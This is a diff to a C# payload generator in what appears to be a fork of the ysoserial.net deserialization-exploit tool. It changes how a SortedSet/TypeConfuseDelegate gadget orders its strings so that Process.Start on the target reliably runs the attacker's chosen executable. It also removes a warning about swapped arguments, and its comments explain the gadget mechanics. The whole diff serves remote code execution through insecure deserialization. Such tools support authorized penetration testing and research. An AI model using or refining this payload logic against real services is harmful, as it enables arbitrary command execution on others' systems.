@@ -380,15 +380,16 @@ namespace ysonet.Generators
 
             string executable = inputArgs.CmdFileName;
             string arguments = inputArgs.HasArguments ? inputArgs.CmdArguments : "";
-            NoteIfArgumentsWillBeSwapped(inputArgs, executable, arguments);
 
             var comparer = new SoapComparisonComparerProxy();
-            int order = comparer.Compare(executable, arguments);
-            string[] items = order == 0
+            // A real SortedSet collapses two equal strings while ysonet fills it, so the
+            // authored document does the same. Otherwise the executable is written SECOND:
+            // the target compares the second item against the first and hands it to
+            // Process.Start as the file name, whatever the two strings sort like. The inner
+            // TypeConfuseDelegate object graph fixes the same order.
+            string[] items = comparer.Compare(executable, arguments) == 0
                 ? new string[] { executable }
-                : (order < 0
-                    ? new string[] { executable, arguments }
-                    : new string[] { arguments, executable });
+                : new string[] { arguments, executable };
 
             DataTable table = new DataTable("x");
             table.RemotingFormat = SerializationFormat.Binary;
@@ -423,18 +424,6 @@ namespace ysonet.Generators
                     FormatterType.SoapFormatter, true);
             return FinishHandWrittenPayload(payload, Formatters.SoapFormatter,
                 inputArgs, null, true);
-        }
-
-        private static void NoteIfArgumentsWillBeSwapped(InputArgs inputArgs,
-            string executable, string arguments)
-        {
-            if (String.Compare(executable, arguments) >= 0)
-                return;
-            Debugging.ShowNote(inputArgs,
-                "[DataTableTypeSpoof TypeConfuseDelegate inner] The executable string "
-                + "sorts BELOW the argument string, so this payload swaps the two "
-                + "Process.Start arguments. Drop --rawcmd, or change the command so the "
-                + "executable sorts above its arguments.");
         }
 
         private static Type RequireSoapType(Assembly assembly, string fullName)
